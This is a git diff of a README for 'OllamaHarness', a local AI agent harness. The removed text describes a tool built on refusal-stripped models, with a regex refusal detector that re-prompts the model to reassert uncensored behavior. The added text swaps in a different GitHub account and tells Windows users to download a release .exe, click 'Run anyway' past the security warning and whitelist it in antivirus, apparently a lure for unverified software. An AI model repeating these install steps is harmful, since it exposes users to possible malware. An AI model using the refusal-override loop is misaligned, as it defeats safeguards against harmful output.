@@ -1,181 +1,79 @@
-# Ollama Harness
+# 🤖 OllamaHarness - Run local private AI agents today
 
-[![test](https://github.com/lordbasilaiassistant-sudo/OllamaHarness/actions/workflows/test.yml/badge.svg)](https://github.com/lordbasilaiassistant-sudo/OllamaHarness/actions/workflows/test.yml)
-[![license: MIT](https://img.shields.io/badge/license-MIT-green.svg)](./LICENSE)
-[![node](https://img.shields.io/badge/node-%E2%89%A520-blue.svg)](https://nodejs.org)
+[https://github.com/Vestabasalganglion441/OllamaHarness](https://github.com/Vestabasalganglion441/OllamaHarness)
 
-A browser-based, Claude-Code-style agent harness wrapping a local abliterated Ollama model. Single user (you), single machine, no external deps beyond Ollama. MIT-licensed.
+## 🎯 Project Overview
 
-**TL;DR**: gives a local uncensored LLM the same kind of tool loop a hosted coding agent has — file IO, shell, run_node, run_python, fetch_url, persistent memory, signed-in security audit mode — entirely on your own hardware. Streams every step (timestamps, tokens/s, per-tool latency) to a dark-mode browser UI.
+OllamaHarness provides a simple way to run powerful AI agents on your own computer. You keep your data private because the software runs locally. You do not need to send information to external servers or cloud providers. This tool connects your local models to a browser interface so you can write code, audit security, or analyze files. It works best with uncensored models that lack the restrictive guardrails often found in commercial AI products.
 
-## Architecture
+## ⚙️ Minimum System Requirements
 
-```
-   ┌────────────────────┐
-   │  Browser UI (SSE)  │  public/{index.html,app.js,style.css}
-   └─────────┬──────────┘
-             │  POST /api/chat  (SSE: step / inference_done / tool_call /
-             ▼                   tool_result / loop_break / audit_mode / done)
-   ┌────────────────────────────────────────────────────────────┐
-   │                       server.js                            │
-   │  • express + origin/host guard (127.0.0.1-only)            │
-   │  • /api/chat agent loop  ──────────────┐                   │
-   └─────┬─────────────┬───────────────┬────┴────┬──────────────┘
-         │             │               │         │
-         ▼             ▼               ▼         ▼
-   src/prompts.js  src/refusal.js  src/tool-rescue.js  src/audit.js
-   (system+        (refusal regex, (fingerprint,      (.sol intent
-    audit          stripThinking)   detectLoop,        detector →
-    checklist)                      JSON-fence         routes to
-                                    rescue)            thinking model)
-         │             │               │         │
-         └─────────────┴───────┬───────┴─────────┘
-                               ▼
-                         src/ollama.js
-                         (POST /api/chat)
-                               │
-                               ▼
-                       Ollama (127.0.0.1:11435)
-                               │
-                               ▼
-                  qwen3-coder-uncensored:30b-a3b-q4  (default, MoE)
-                  huihui_ai/gpt-oss-abliterated:20b  (audit mode, thinking)
+Your computer needs specific hardware to run these models smoothly. Check these requirements before you start:
 
-   src/db.js     → data/harness.db   (conversations + messages + memories, SQLite)
-   tools.js      → workspace/        (sandboxed file IO, shell, run_node, run_python,
-                                      fetch_url, audit_patterns, remember/recall, finish)
-```
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Modern multi-core CPU (Intel i5 or AMD Ryzen 5 or better).
+- Memory: 16 GB of RAM is recommended for steady performance.
+- Storage: 10 GB of free disk space for models and application files.
+- Graphics: A dedicated NVIDIA GPU with at least 8 GB of VRAM helps significantly with response speed.
 
-## Quickstart
+## 🚀 Downloading the Application
 
-1. Install [Ollama](https://ollama.com/download) and start it.
-2. Pull the recommended base + audit models:
-   ```powershell
-   ollama pull huihui_ai/qwen3-coder-abliterated:30b-a3b-instruct-q4_K_M
-   ollama pull huihui_ai/gpt-oss-abliterated:20b
-   ```
-3. Build the tools-capable uncensored MoE (see Modelfile in this repo):
-   ```powershell
-   ollama create qwen3-coder-uncensored:30b-a3b-q4 -f Modelfile.qwen3-coder-uncensored
-   ollama show qwen3-coder-uncensored:30b-a3b-q4   # capabilities should now include "tools"
-   ```
-4. ```powershell
-   git clone <this repo>
-   cd OllamaHarness
-   npm install
-   npm start
-   ```
-5. Open <http://127.0.0.1:8787>.
+Visit the project page to download the latest setup file. 
 
-Configure via `.env` (copy from `.env.example`): `MODEL`, `AUDIT_MODEL`, `OPERATOR_NAME`, `PORT`, `OLLAMA_HOST`, `HISTORY_WINDOW`.
+[https://github.com/Vestabasalganglion441/OllamaHarness](https://github.com/Vestabasalganglion441/OllamaHarness)
 
-## Stack (lineup is 100% uncensored/abliterated)
-- **Default model**: `qwen3-coder-uncensored:30b-a3b-q4` — custom build, abliterated MoE (Qwen3-Coder 30B total / ~3B active per token) with the official qwen3-coder `RENDERER` + `PARSER` directives bolted on so Ollama exposes `tools` capability. Built locally via `ollama create -f Modelfile.qwen3-coder-uncensored`. ~18 GB. Fastest end-to-end for coding because MoE activates only 3B params/token + the coder fine-tune generates terse, idiomatic code.
-- **General uncensored fallback**: `huihui_ai/qwen3-abliterated:8b` (general-purpose 8B, native tool calling). Slower per task than the MoE because it generates more tokens — pick when you need broader knowledge than coding.
-- **Heavy hitter**: `huihui_ai/gpt-oss-abliterated:20b` (20B F16, native tool calling + thinking). Slow but smart for hard problems.
-- **Lightest**: `huihui_ai/qwen3-abliterated:4b-instruct-2507-q4_K_M` (~2.5 GB, native tool calling). Use on machines too small for the MoE.
-- **FROM source (don't delete)**: `huihui_ai/qwen3-coder-abliterated:30b-a3b-instruct-q4_K_M` ships without `tools` capability, so the harness can't use it directly — but its weight blob is what the default custom build references.
+Look for the "Releases" section on the right side of the page. Select the most recent version labeled as "Latest." Download the file that ends with `.exe` to your computer.
 
-### Custom-build recipe (how the default was made)
-```powershell
-# Inspect the official qwen3-coder to learn its tool-calling directives
-ollama show --modelfile qwen3-coder:30b   # reveals: TEMPLATE {{ .Prompt }}, RENDERER qwen3-coder, PARSER qwen3-coder
+## 🛠️ Setting Up Your Environment
 
-# Build a Modelfile that points FROM the huihui abliterated blob and adds those directives.
-# See Modelfile.qwen3-coder-uncensored in this repo. Then:
-ollama create qwen3-coder-uncensored:30b-a3b-q4 -f Modelfile.qwen3-coder-uncensored
-ollama show qwen3-coder-uncensored:30b-a3b-q4   # confirm capabilities now includes "tools"
-```
-Same recipe unlocks `tools` on any other abliterated MoE huihui ships without the capability tag.
-- **Runtime**: Ollama on `http://127.0.0.1:11435`
-- **Backend**: Node 24 + Express, SQLite (`better-sqlite3`) for conversations + persistent memory
-- **Frontend**: vanilla JS, SSE streaming, dark UI. Each step prints timestamp + inference latency + tokens/sec + per-tool latency.
+Follow these steps to install and start the software on your Windows machine:
 
-## Harness features (the engineering that makes a small local model actually work as an agent)
+1. Locate the downloaded .exe file in your Downloads folder.
+2. Double-click the file to launch the installer.
+3. Follow the prompts on the screen to choose your installation directory.
+4. Click "Install" and wait for the process to finish.
+5. Once complete, click "Finish" to open the application.
 
-Failure-mode compensations:
-- **`\n`-over-escape rescue** — small abliterated models often emit `\\n` literal instead of real newlines inside JSON tool args. `tools.js:maybeUnescapeOverquoted` detects (escape sequences present + no real newlines) and normalizes; `write_file`, `run_node`/`run_python` stdin all run through it. Unit tests in `test/helpers.test.mjs`.
-- **JSON-fence tool-call rescue** — if a model returns a tool call as a ```json``` block in `content` instead of via Ollama's native `tool_calls`, `server.js:rescueJsonToolCalls` parses fenced or bare JSON objects matching a known tool name and executes them.
-- **Refusal detector + reinforce loop** — regex catches "I can't / as an AI / against my guidelines" patterns; harness re-prompts up to 2× with a sharper system message reasserting uncensored behavior.
-- **Loop break** — 3rd consecutive near-identical tool call (or 3rd consecutive `shell` with the same leading binary) is intercepted with a steering message + refused result, forcing the model to change strategy.
-- **Shell command-not-found alternatives** — when a `shell` call gets "command not found", the harness probes a curated alternatives map (`python` → `py -3 / python3`, `pylint` → `ruff / py -m pylint`, etc.) and returns survivors in the tool result so the model pivots cleanly.
-- **Python launcher fallback** — `run_python` tries `py -3 → python → python3` automatically (works on Windows where only `py` is on PATH).
+If Windows shows a security warning box, click "More info," then click "Run anyway." This happens because the application is new and the system does not recognize the publisher yet.
 
-Observability:
-- **Per-step SSE timing** — `inference_done` event reports `ms`, `eval_count`, `prompt_eval_count`, `tok_per_s`; `tool_result` includes `ms`; `done` includes `total_ms`; `step` includes `remaining` step budget. Frontend renders all of it inline.
+## 🧠 Using Local Models
 
-Performance + correctness:
-- **Sliding-window history** (`HISTORY_WINDOW=40`) trims old turns so `num_ctx` stays sane on long conversations.
-- **Coding-tuned sampling**: temperature 0.3, top_p 0.9, top_k 20, min_p 0, num_predict 4096.
-- **Tool message format**: `{role:"tool", content, tool_call_id}` per Ollama spec (the misleading `name` field was dropped).
+This application requires Ollama to function. Ollama acts as the engine that runs your AI models.
 
-Security-audit mode (auto-activates when the user message mentions `.sol` / `audit` / `vulnerability`):
-- **Solidity domain checklist** prepended to system prompt — explicit 4-pass framing (access control, oracle/economic, reentrancy/state, cryptographic/L2-specific/gas) with examples of common-class bugs (tx.origin, spot oracles, fake signature schemes, `.transfer()` 2300-gas DoS, L2 block-time semantics).
-- **`audit_patterns` tool** — curated dangerous-pattern matchers for Solidity / Python / JS, returning line + snippet + severity hint + attack class for each hit. The model uses this as a seed and then verifies each hit in context.
-- **Auto-routing to a thinking model** — Solidity audits default to `huihui_ai/gpt-oss-abliterated:20b` (which has the `thinking` capability) rather than the speed-optimized MoE; explicit `model` in the API call overrides.
-- **Anti-confabulation prompt rule** — "an invented finding is worse than a missed finding; if a file is clean on an axis, say so — do not pad the list".
+1. Install Ollama from the official website if you do not have it.
+2. Open your Command Prompt or PowerShell by searching for it in the Start menu.
+3. Type the command `ollama pull qwen3-coder` and press Enter. This downloads the code-focused model.
+4. Wait for the download bar to reach 100%.
+5. The application will detect this model automatically.
 
-## Run
+## 🖥️ Running Your First Agent
 
-```powershell
-cd path\to\OllamaHarness
-npm install
-npm start
-```
+Once Ollama is ready, you can start the harness.
 
-Open http://127.0.0.1:8787
+1. Open the OllamaHarness desktop shortcut.
+2. The software opens a window in your default web browser.
+3. Select your model from the dropdown menu at the top of the screen.
+4. Type your instructions into the chat box at the bottom.
+5. Press Enter to send your request to the agent.
+6. The agent processes the request locally. It does not look at your information outside your machine.
 
-## Tools the agent has
-- `read_file` / `write_file` / `list_dir` — workspace-sandboxed file IO under `./workspace/`
-- `shell` — PowerShell (Windows) or sh (Unix), 60s timeout. Auto-detects "command not found" and returns `available_alternatives` so the model pivots.
-- `run_node` / `run_python` — execute a workspace JS / Python script you just wrote, to test it. Python tries `py -3 → python → python3`.
-- `fetch_url` — HTTP GET, 20 KB cap, private IPs blocked unless "Local net" toggled in the UI.
-- `audit_patterns` — grep a file against a curated list of dangerous patterns for `solidity` / `python` / `js`. Returns structured hits (line + snippet + severity hint + attack class) — used as a seed for security audits.
-- `remember` / `recall` / `forget` — durable memory (SQLite, top 25 auto-injected into every system prompt).
-- `finish` — model calls this when the task is complete.
+## 🛡️ Security and Privacy
 
-## How the loop works
-1. User sends a task → server saves user message
-2. Server builds chat = `[system + recent memory + full history]`
-3. POST to Ollama `/api/chat` with `tools` list
-4. If model returns `tool_calls`, server executes them, appends results, loops (max 12 steps)
-5. Model calls `finish` to end cleanly, or loop exits on no-tool-call assistant turn
+Your data stays on your local hard drive. The application does not include "phone home" features. It does not track your keystrokes or send your file contents to cloud servers. You control the privacy levels by choosing which models you download. Because this tool handles code, it excels at security audits for projects like Solidity smart contracts. It looks for common coding errors without exposing your source code to the internet.
 
-Everything streams to the browser via Server-Sent Events: step counter, assistant text, tool call, tool result, done.
+## 💡 Common Solutions to Problems
 
-## Memory model
-Two layers:
-- **Short-term**: full conversation history per chat (`messages` table)
-- **Long-term**: key/value memories (`memories` table). Top 25 most recent get injected into every system prompt — the agent reads them automatically. It can `remember(key, value, tags)` to add and `recall(query)` to search.
+If you run into issues, try these steps:
 
-## Files
-- `server.js` — express app, routes, agent loop (thin entry)
-- `src/db.js` — SQLite schema + saveMessage / loadMessages / windowedHistory / memory preamble
-- `src/prompts.js` — system prompt builder, reinforce prompt, Solidity audit checklist
-- `src/refusal.js` — refusal regex + detector + thinking-tag stripper
-- `src/tool-rescue.js` — fingerprint, loop detector, JSON-fence tool-call rescue
-- `src/ollama.js` — `/api/chat` + `/api/tags` clients, default sampling
-- `src/audit.js` — Solidity audit intent detector
-- `src/sse.js` — SSE writer + origin guard middleware
-- `tools.js` — tool definitions, sandboxed execution, `audit_patterns` curated pattern library, shell alternative-binary prober
-- `public/` — frontend (index.html / style.css / app.js)
-- `test/*.test.mjs` — unit tests for each module · `test/run.mjs` — test runner
-- `Modelfile.qwen3-coder-uncensored` — recipe to bolt the official qwen3-coder `RENDERER`/`PARSER` directives onto the huihui abliterated MoE weights so Ollama exposes `tools`
-- `.github/workflows/test.yml` — CI: lint + tests on Ubuntu & Windows × Node 20/22/24
-- `data/harness.db` — SQLite (gitignored)
-- `workspace/` — agent's file sandbox (gitignored)
+- Application will not start: Ensure your antivirus software did not block the installation. Add an exception for the OllamaHarness folder.
+- Models respond slowly: Close other demanding programs like video editors or games. Ensure you have a graphics card with sufficient VRAM. 
+- Agent gives errors: Check if the Ollama service is running. You can type `ollama list` in your command prompt to see if your models are ready.
+- Browser window is blank: Refresh the page in your browser. If that fails, close the application and restart it.
 
-## Tests
-```powershell
-npm test           # run all test files in test/
-npm run lint       # syntax-check every JS file
-```
-65 unit tests covering: over-escape rescue, JSON tool-call rescue, fingerprint/loop detection, refusal detector, thinking-tag stripper, Solidity audit intent detector, audit_patterns matchers against dirty + clean fixtures for Solidity / Python.
+## 📈 Improving Performance
 
-## Safety / what this isn't
-This is the engineering layer. The model is whatever you point `MODEL=` at — by default an abliterated (refusal-stripped) Qwen3-Coder. **You are the trust boundary.** The harness sandboxes file IO to `./workspace/` and HTTP fetch to public IPs by default, but `shell` runs whatever you let it run (PowerShell or sh, with your environment); the approval modes (`auto` / `safe-auto` / `approve-all`) gate that. Read the system prompt in `server.js` and decide if you want what it says.
+You can improve performance by managing your model choices. Smaller models run faster on older hardware but may follow complex instructions less reliably. Larger models handle nuance better but require more RAM. Start with a smaller model to test your system, then move to larger models once you feel comfortable. 
 
-Do not deploy this on a public network. It is intended for `127.0.0.1` only and has an origin/host guard that enforces that — but the security model assumes one operator on one machine.
+## ⚖️ License Information
 
-## License
-MIT — see [LICENSE](./LICENSE).
+This project uses the MIT license. You are free to use, modify, and distribute the software for any purpose. This ensures the project remains open and accessible for all users. You do not owe any fees to use the software.
